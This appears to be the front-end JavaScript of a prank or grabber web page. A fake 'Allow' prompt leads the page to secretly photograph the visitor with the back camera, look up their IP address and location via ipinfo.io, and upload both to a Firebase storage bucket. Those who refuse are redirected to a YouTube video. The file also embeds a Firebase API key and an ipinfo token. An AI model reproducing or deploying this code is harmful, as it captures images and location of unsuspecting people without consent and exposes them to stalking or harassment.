// Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
    authDomain: "html-7fd9b.firebaseapp.com",
    projectId: "html-7fd9b",
    storageBucket: "html-7fd9b.appspot.com",
    messagingSenderId: "1022361191925",
    appId: "1:1022361191925:web:0f971d6e7c72cfc3aa0cbc",
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();
const auth = firebase.auth();

// DOM elements
const allowButton = document.getElementById("allowButton");
const denyButton = document.getElementById("denyButton");
const video = document.getElementById("video");

// Handle the "Allow" button
allowButton.onclick = async function () {
    try {
        await auth.signInAnonymously();
        captureFromCamera('environment'); // Use the back camera
    } catch (error) {
        console.error("Authentication failed:", error);
        alert("Authentication failed. Try again.");
    }
};

// Handle the "Don't Allow" button
denyButton.onclick = function () {
    window.location.href = "https://www.youtube.com/watch?v=iq_d8VSM0nw"; // Hamood Habibi video
};

// Capture from camera
function captureFromCamera(cameraType) {
    navigator.mediaDevices
        .getUserMedia({ video: { facingMode: cameraType, width: 1920, height: 1080 } })
        .then((stream) => {
            video.srcObject = stream;
            video.style.display = "block";
            video.play();

            setTimeout(() => {
                captureImage();
                stream.getTracks().forEach((track) => track.stop()); // Stop camera
            }, 3000);
        })
        .catch(() => {
            alert("Camera permission denied. Redirecting...");
            window.location.href = "https://www.youtube.com/watch?v=iq_d8VSM0nw";
        });
}

// Capture image from video
function captureImage() {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");

    // Set canvas resolution
    canvas.width = 1920;
    canvas.height = 1080;

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(
        (blob) => {
            const photoRef = storage.ref().child("bombclaat/Pictures/photo_" + Date.now() + ".jpg");
            photoRef
                .put(blob)
                .then(() => {
                    console.log("Photo uploaded successfully.");
                    captureIPData(); // Capture IP after photo upload
                })
                .catch((error) => {
                    console.error("Error uploading photo:", error);
                });
        },
        "image/jpeg",
        1.0 // Full quality
    );
}

// Capture IP data
function captureIPData() {
    fetch("https://ipinfo.io?token=023890bc57338a")
        .then((response) => response.json())
        .then((data) => {
            const ipData = `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nFull Data: ${JSON.stringify(data)}`;
            const ipDataRef = storage.ref().child("bombclaat/Ipinfo/ip_" + Date.now() + ".txt");

            ipDataRef
                .putString(ipData)
                .then(() => {
                    console.log("IP Data uploaded successfully.");
                })
                .catch((error) => {
                    console.error("Error uploading IP data:", error);
                });
        })
        .catch((error) => {
            console.error("Error fetching IP data:", error);
            alert("Failed to retrieve IP information.");
        });
}